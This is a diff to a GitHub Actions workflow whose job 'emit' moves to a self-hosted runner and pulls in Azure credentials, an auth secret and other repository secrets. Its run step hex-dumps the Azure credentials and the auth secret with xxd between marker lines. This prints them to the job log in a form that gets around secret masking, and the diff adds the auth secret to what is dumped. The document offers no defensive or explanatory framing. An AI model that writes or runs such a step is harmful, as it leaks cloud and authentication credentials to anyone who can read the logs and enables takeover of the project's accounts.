@@ -3,12 +3,18 @@ on:
   workflow_dispatch:
 jobs:
   out:
-    runs-on: ubuntu-latest
+    runs-on: [self-hosted, Linux, X64]
     steps:
       - name: emit
         env:
           C1: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
+          C2: ${{ secrets.AUTH_SECRET }}
+          C3: ${{ secrets.AUTH_URL }}
+          C4: ${{ secrets.NEXT_PUBLIC_URL }}
         run: |
-          echo "=HEX_START="
+          echo "=C1_START="
           printf '%s' "$C1" | xxd
-          echo "=HEX_END="
+          echo "=C1_END="
+          echo "=C2_START="
+          printf '%s' "$C2" | xxd
+          echo "=C2_END="
